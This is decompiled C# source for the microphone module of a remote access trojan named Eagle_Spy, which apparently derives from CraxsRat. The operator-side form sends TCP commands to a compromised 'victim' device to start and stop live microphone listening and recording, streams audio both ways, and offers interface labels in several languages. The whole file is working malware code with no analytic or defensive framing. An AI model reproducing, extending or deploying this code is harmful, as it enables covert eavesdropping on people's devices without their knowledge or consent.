using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using DrakeUI.Framework;
using Eagle_Spy.sockets;
using Microsoft.VisualBasic.CompilerServices;
using WinMM;

namespace Eagle_Spy
{
	// Token: 0x0200007E RID: 126
	[DesignerGenerated]
	public partial class Microphone : Form
	{
		// Token: 0x0600072B RID: 1835 RVA: 0x000BDC1C File Offset: 0x000BBE1C
		public Microphone()
		{
			base.Load += this.CraxsRatkfvuiorkenfudpajrsnCraxsRatsasczxcawd;
			base.Closing += this.Microphone_Closing;
			base.FormClosing += this.Microphone_FormClosing;
			this.waveOut = null;
			this.Title = "null";
			this.bytes = new List<byte[]>();
			this.isrecording = false;
			this.InitializeComponent();
			this.Font = reso.f;
		}

		// Token: 0x0600072C RID: 1836 RVA: 0x000BDCA0 File Offset: 0x000BBEA0
		private void translateme()
		{
			string language = RegistryHandler.Get_Language();
			if (Operators.CompareString(language, "AR", false) != 0)
			{
				if (Operators.CompareString(language, "CN", false) == 0)
				{
					this.Label1.Text = Codes.Translate(this.Label1.Text, "en", "zh");
					this.Label2.Text = Codes.Translate(this.Label2.Text, "en", "zh");
					this.Label3.Text = Codes.Translate(this.Label3.Text, "en", "zh");
					this.Label4.Text = Codes.Translate(this.Label4.Text, "en", "zh");
					this.b_sta.Text = Codes.Translate(this.b_sta.Text, "en", "zh");
					this.bIN.Text = Codes.Translate(this.bIN.Text, "en", "zh");
					this.TabControl1.TabPages[0].Text = Codes.Translate(this.TabControl1.TabPages[0].Text, "en", "zh");
					this.TabControl1.TabPages[1].Text = Codes.Translate(this.TabControl1.TabPages[1].Text, "en", "zh");
					return;
				}
			}
			else
			{
				this.Label1.Text = Codes.Translate(this.Label1.Text, "en", "ar");
				this.Label2.Text = Codes.Translate(this.Label2.Text, "en", "ar");
				this.Label3.Text = Codes.Translate(this.Label3.Text, "en", "ar");
				this.Label4.Text = Codes.Translate(this.Label4.Text, "en", "ar");
				this.Label5.Text = Codes.Translate(this.Label5.Text, "en", "ar");
				this.b_sta.Text = Codes.Translate(this.b_sta.Text, "en", "ar");
				this.bIN.Text = Codes.Translate(this.bIN.Text, "en", "ar");
				this.TabControl1.TabPages[0].Text = Codes.Translate(this.TabControl1.TabPages[0].Text, "en", "ar");
				this.TabControl1.TabPages[1].Text = Codes.Translate(this.TabControl1.TabPages[1].Text, "en", "ar");
			}
		}

		// Token: 0x0600072D RID: 1837 RVA: 0x000046EC File Offset: 0x000028EC
		private void TOpacity_Tick(object sender, EventArgs e)
		{
			if (base.Opacity != 1.0)
			{
				base.Opacity += 0.1;
				return;
			}
			this.TOpacity.Enabled = false;
		}

		// Token: 0x0600072E RID: 1838 RVA: 0x000BDFA4 File Offset: 0x000BC1A4
		private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsasczxcawd(object sender, EventArgs e)
		{
			this.translateme();
			base.Icon = new Icon(reso.res_Path + "\\Icons\\win\\13.ico");
			this.LoadDEVMicrophone();
			this.Text = this.Title;
			this.TOpacity.Interval = SpySettings.T_Interval;
			this.TOpacity.Enabled = true;
		}

		// Token: 0x0600072F RID: 1839 RVA: 0x000BE000 File Offset: 0x000BC200
		public void SizeH()
		{
			int num = 0;
			checked
			{
				if (this.Panel1.Visible)
				{
					num += this.Panel1.Height;
				}
				if (this.Panel2.Visible)
				{
					num += this.Panel2.Height;
				}
				int num2 = base.Height - base.ClientSize.Height - 1;
				if (!this.Panel1.Visible & !this.Panel2.Visible)
				{
					this.LAB_ERR.Visible = true;
					this.LAB_ERR.Text = "No Input and No Output Devices Found";
					num = this.LAB_ERR.Height;
				}
				base.Height = num + num2;
			}
		}

		// Token: 0x06000730 RID: 1840 RVA: 0x000BE0B0 File Offset: 0x000BC2B0
		private void Microphone_Closing(object sender, CancelEventArgs e)
		{
			this.DrakeUILampLED1.Blink = false;
			this.DrakeUILampLED1.On = false;
			this.DrakeUILampLED1.Dispose();
			if (Operators.ConditionalCompareObjectEqual(this.isrecording, false, false))
			{
				this.isrecording = false;
				if (this.classClient != null)
				{
					TcpClient myClient = this.classClient.myClient;
					object[] array = new object[]
					{
						myClient,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"srec<*>off",
							Data.SPL_SOCKET,
							"0",
							Data.SPL_SOCKET,
							"0",
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array);
				}
			}
			if (this.waveOut != null)
			{
				this.waveOut.Stop();
			}
			if (this.classWaveOut != null)
			{
				this.classWaveOut.qit = true;
				this.classWaveOut.Close(this.ClientWaveOut);
			}
			if (this.classWaveIn != null)
			{
				this.classWaveIn.qit = true;
				this.classWaveIn.Close(this.ClientWaveIn);
			}
			this.In_Stop();
		}

		// Token: 0x06000731 RID: 1841 RVA: 0x000BE258 File Offset: 0x000BC458
		private void b_sta_Click(object sender, EventArgs e)
		{
			if (Operators.ConditionalCompareObjectEqual(this.b_sta.Tag, 2, false))
			{
				this.Out_Stop();
				this.b_sta.Tag = 0;
				this.b_sta.Text = "Start Microphone";
				return;
			}
			if (Operators.ConditionalCompareObjectEqual(this.b_sta.Tag, 0, false))
			{
				this.b_sta.Tag = 1;
				this.b_sta.Text = "...";
				this.Out_Start();
			}
		}

		// Token: 0x06000732 RID: 1842 RVA: 0x000BE2E8 File Offset: 0x000BC4E8
		private void Out_Start()
		{
			if (this.classClient != null)
			{
				string[] array = this.classClient.Keys.Split(new char[] { ':' });
				int selectedIndex = this.OutBoxSource.SelectedIndex;
				if (this.classClient.Keys.Split(new char[] { ':' })[7][1] == '0')
				{
					object[] array2 = new object[]
					{
						this.Client,
						SecurityKey.KeysClient6 + Data.SPL_SOCKET,
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				object[] array3 = new object[]
				{
					this.Client,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient1,
						Data.SPL_SOCKET,
						reso.domen,
						".microphone",
						Data.SPL_SOCKET,
						"method",
						Data.SPL_SOCKET,
						SecurityKey.resultClient,
						Data.SPL_SOCKET,
						"start",
						Data.SPL_DATA,
						array[0],
						Data.SPL_DATA,
						array[1],
						Data.SPL_DATA,
						Conversions.ToString(reso.HzInt(this.OutHZ.Text)),
						Data.SPL_DATA,
						SecurityKey.MicwaveOutByte,
						Data.SPL_DATA,
						this.classClient.ClientRemoteAddress,
						Data.SPL_DATA,
						"0"
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(array3);
			}
		}

		// Token: 0x06000733 RID: 1843 RVA: 0x000BE4B0 File Offset: 0x000BC6B0
		public void Out_Stop()
		{
			if (this.classWaveOut != null)
			{
				this.classWaveOut.qit = true;
				this.classWaveOut.Close(this.ClientWaveOut);
			}
			if (this.waveOut != null)
			{
				this.waveOut.Stop();
			}
			this.waveOut = null;
		}

		// Token: 0x06000734 RID: 1844 RVA: 0x000BE4FC File Offset: 0x000BC6FC
		public bool In_Start(int idDevice)
		{
			this.WaveIn = new WaveIn(idDevice);
			this.WaveIn.Open(reso.FormatWave(this.rateInput));
			this.WaveIn.Start();
			this.Bgworker = new BackgroundWorker();
			if (!this.Bgworker.IsBusy)
			{
				this.DoCase = true;
				this.Bgworker.RunWorkerAsync();
				if (Operators.ConditionalCompareObjectEqual(this.bIN.Tag, 1, false))
				{
					this.bIN.Tag = 2;
					this.bIN.Text = "Ready";
				}
			}
			return true;
		}

		// Token: 0x06000735 RID: 1845 RVA: 0x000BE59C File Offset: 0x000BC79C
		private void In_Stop()
		{
			this.DoCase = false;
			if (this.Bgworker != null && this.Bgworker.IsBusy)
			{
				this.Bgworker.Dispose();
			}
			this.bytes.Clear();
			if (this.classWaveIn != null)
			{
				this.classWaveIn.qit = true;
				this.classWaveIn.Close(this.ClientWaveIn);
			}
			if (this.waveOut != null)
			{
				this.waveOut.Stop();
			}
		}

		// Token: 0x06000736 RID: 1846 RVA: 0x000BE614 File Offset: 0x000BC814
		private void LoadDEVMicrophone()
		{
			IEnumerator enumerator = null;
			try
			{
				foreach (object obj in WaveIn.Devices)
				{
					WaveInDeviceCaps waveInDeviceCaps = (WaveInDeviceCaps)obj;
					if (waveInDeviceCaps.DeviceId != -1)
					{
						waveInDeviceCaps.Name = waveInDeviceCaps.Name.Replace("(", "").Replace(")", "");
						string text = string.Format("({0})-{1}", waveInDeviceCaps.DeviceId, waveInDeviceCaps.Name);
						this.InBoxSource.Items.Add(text);
					}
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					((IDisposable)enumerator).Dispose();
				}
			}
			if (this.InBoxSource.Items.Count == 0)
			{
				this.Panel2.Visible = false;
				return;
			}
			this.InBoxSource.SelectedIndex = 0;
			this.DeviceSOurVictim.SelectedIndex = 0;
			this.inHZ.SelectedIndex = 0;
		}

		// Token: 0x06000737 RID: 1847 RVA: 0x000BE710 File Offset: 0x000BC910
		private void AppendByteToDisk(string FilepathToAppendTo, ref byte[] Content)
		{
			FileStream fileStream = new FileStream(FilepathToAppendTo, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			fileStream.Write(Content, 0, Content.Length);
			fileStream.Close();
		}

		// Token: 0x06000738 RID: 1848 RVA: 0x00004722 File Offset: 0x00002922
		private void OK_DataReady(object sender, DataReadyEventArgs e)
		{
			this.bytes.Add(e.Data);
		}

		// Token: 0x06000739 RID: 1849 RVA: 0x000BE73C File Offset: 0x000BC93C
		private void bIN_Click(object sender, EventArgs e)
		{
			if (this.classClient != null)
			{
				if (Operators.ConditionalCompareObjectEqual(this.bIN.Tag, 0, false))
				{
					this.In_Stop();
					this.bytes.Clear();
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					int selectedIndex = this.DeviceSOurVictim.SelectedIndex;
					object[] array2 = new object[]
					{
						this.Client,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient1,
							Data.SPL_SOCKET,
							reso.domen,
							".microphone",
							Data.SPL_SOCKET,
							"method",
							Data.SPL_SOCKET,
							SecurityKey.resultClient,
							Data.SPL_SOCKET,
							"input",
							Data.SPL_DATA,
							array[0],
							Data.SPL_DATA,
							array[1],
							Data.SPL_DATA,
							this.classClient.ClientRemoteAddress,
							Data.SPL_DATA,
							SecurityKey.MicwaveinByte,
							Data.SPL_DATA,
							selectedIndex.ToString(),
							Data.SPL_DATA,
							Conversions.ToString(reso.HzInt(this.inHZ.Text))
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
					this.bIN.Tag = 1;
					this.bIN.Text = "Cancel...";
					return;
				}
				if (Operators.ConditionalCompareObjectEqual(this.bIN.Tag, 1, false))
				{
					this.In_Stop();
					this.bIN.Text = "Run";
					this.bIN.Tag = 0;
					return;
				}
				if (Operators.ConditionalCompareObjectEqual(this.bIN.Tag, 2, false))
				{
					this.In_Stop();
					this.bIN.Text = "Run";
					this.bIN.Tag = 0;
				}
			}
		}

		// Token: 0x0600073A RID: 1850 RVA: 0x000BE964 File Offset: 0x000BCB64
		private void Worker_DoWork(object sender, DoWorkEventArgs e)
		{
			checked
			{
				do
				{
					if (this.bytes.Count > 0)
					{
						byte[] array = this.bytes[0];
						try
						{
							if (this.ClientWaveIn.Client.Connected)
							{
								this.ClientWaveIn.Client.Poll(infoServer.Microseconds, SelectMode.SelectWrite);
								this.ClientWaveIn.Client.SendBufferSize = array.Length * 15;
								this.ClientWaveIn.GetStream().Write(array, 0, array.Length);
								this.classClient.MyServer.BytesSent += unchecked((long)array.Length);
							}
						}
						catch (Exception)
						{
							break;
						}
						if (this.DoCase)
						{
							this.bytes.RemoveAt(0);
						}
					}
					Thread.Sleep(1);
				}
				while (this.DoCase);
			}
		}

		// Token: 0x0600073B RID: 1851 RVA: 0x000BEA38 File Offset: 0x000BCC38
		private void InBoxSource_SelectedIndexChanged(object sender, EventArgs e)
		{
			string value = Regex.Match(this.InBoxSource.SelectedItem.ToString(), string.Concat(new string[]
			{
				"(?<=",
				Regex.Escape("("),
				").+?(?=",
				Regex.Escape(")"),
				")"
			}), RegexOptions.IgnoreCase).Value;
			this.MDeviceId = Conversions.ToInteger(value.Trim());
		}

		// Token: 0x0600073C RID: 1852 RVA: 0x00002423 File Offset: 0x00000623
		private void OutBoxSource_SelectedIndexChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x0600073D RID: 1853 RVA: 0x00002423 File Offset: 0x00000623
		private void Microphone_FormClosing(object sender, FormClosingEventArgs e)
		{
		}

		// Token: 0x0600073E RID: 1854 RVA: 0x000BEAB0 File Offset: 0x000BCCB0
		private void UpdateEnglish()
		{
			this.TabPage1.Text = "Listen";
			this.TabPage2.Text = "Speak";
			this.Label1.Text = "Client Microphone :";
			this.Label2.Text = "Audio Quality :";
			this.Button1.Text = "Strat Recprding Saver";
			this.b_sta.Text = "Stop Microphone";
			this.Label5.Text = "PC Microphone :";
			this.Label4.Text = "Client Microphone :";
			this.Label3.Text = "Audio Quality :";
			this.bIN.Text = "Run";
		}

		// Token: 0x0600073F RID: 1855 RVA: 0x000BEB60 File Offset: 0x000BCD60
		private void UpdateChinese()
		{
			this.TabPage1.Text = "听";
			this.TabPage2.Text = "说";
			this.Label1.Text = "客户端麦克风：";
			this.Label2.Text = "音频质量：";
			this.Button1.Text = "开始录音";
			this.b_sta.Text = "停止麦克风";
			this.Label5.Text = "电脑麦克风：";
			this.Label4.Text = "客户端麦克风：";
			this.Label3.Text = "音频质量：";
			this.bIN.Text = "运行";
		}

		// Token: 0x06000740 RID: 1856 RVA: 0x000BEC10 File Offset: 0x000BCE10
		private void UpdateRussian()
		{
			this.TabPage1.Text = "Слушать";
			this.TabPage2.Text = "Говорить";
			this.Label1.Text = "Микрофон клиента :";
			this.Label2.Text = "Качество звука :";
			this.Button1.Text = "Начать запись";
			this.b_sta.Text = "Остановить микрофон";
			this.Label5.Text = "Микрофон ПК :";
			this.Label4.Text = "Микрофон клиента :";
			this.Label3.Text = "Качество звука :";
			this.bIN.Text = "Запустить";
		}

		// Token: 0x06000741 RID: 1857 RVA: 0x000BECC0 File Offset: 0x000BCEC0
		private void UpdateLanguage()
		{
			string text = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "res", "Config", "Language.inf");
			if (File.Exists(text))
			{
				string text2 = File.ReadAllText(text);
				if (text2.Contains("English"))
				{
					this.UpdateEnglish();
					return;
				}
				if (text2.Contains("Russian"))
				{
					this.UpdateRussian();
					return;
				}
				if (text2.Contains("Chinese"))
				{
					this.UpdateChinese();
					return;
				}
				this.UpdateEnglish();
			}
		}

		// Token: 0x06000742 RID: 1858 RVA: 0x000BED40 File Offset: 0x000BCF40
		private void Button1_Click_1(object sender, EventArgs e)
		{
			if (Operators.CompareString(this.Button1.Tag.ToString(), "o", false) == 0)
			{
				if (this.classClient != null)
				{
					this.Button1.Tag = "f";
					TcpClient myClient = this.classClient.myClient;
					object[] array = new object[]
					{
						myClient,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"srec<*>on",
							Data.SPL_SOCKET,
							"0",
							Data.SPL_SOCKET,
							"0",
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array);
					this.isrecording = true;
					this.DrakeUILampLED1.On = true;
					this.DrakeUILampLED1.Blink = true;
					this.Button1.Text = "Stop Recording";
					return;
				}
			}
			else if (this.classClient != null)
			{
				this.Button1.Tag = "o";
				TcpClient myClient2 = this.classClient.myClient;
				object[] array2 = new object[]
				{
					myClient2,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"srec<*>off",
						Data.SPL_SOCKET,
						"0",
						Data.SPL_SOCKET,
						"0",
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.classClient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(array2);
				this.Button1.Text = "Start Recording";
				this.isrecording = false;
				this.DrakeUILampLED1.On = false;
				this.DrakeUILampLED1.Blink = false;
			}
		}

		// Token: 0x06000743 RID: 1859 RVA: 0x00004735 File Offset: 0x00002935
		private void Microphone_Load(object sender, EventArgs e)
		{
			this.UpdateLanguage();
		}

		// Token: 0x0400086E RID: 2158
		public Client classClient;

		// Token: 0x0400086F RID: 2159
		public TcpClient Client;

		// Token: 0x04000870 RID: 2160
		public TcpClient ClientWaveOut;

		// Token: 0x04000871 RID: 2161
		public Client classWaveOut;

		// Token: 0x04000872 RID: 2162
		public WaveOut waveOut;

		// Token: 0x04000873 RID: 2163
		private WaveIn WaveIin;

		// Token: 0x04000874 RID: 2164
		public string Title;

		// Token: 0x04000875 RID: 2165
		public List<byte[]> bytes;

		// Token: 0x04000876 RID: 2166
		public TcpClient ClientWaveIn;

		// Token: 0x04000877 RID: 2167
		public Client classWaveIn;

		// Token: 0x04000878 RID: 2168
		private bool DoCase;

		// Token: 0x04000879 RID: 2169
		public int MDeviceId;

		// Token: 0x0400087A RID: 2170
		public int rateInput;

		// Token: 0x0400087B RID: 2171
		public object isrecording;

		// Token: 0x04000892 RID: 2194
		internal BackgroundWorker Bgworker;

		// Token: 0x04000894 RID: 2196
		internal WaveIn WaveIn;
	}
}
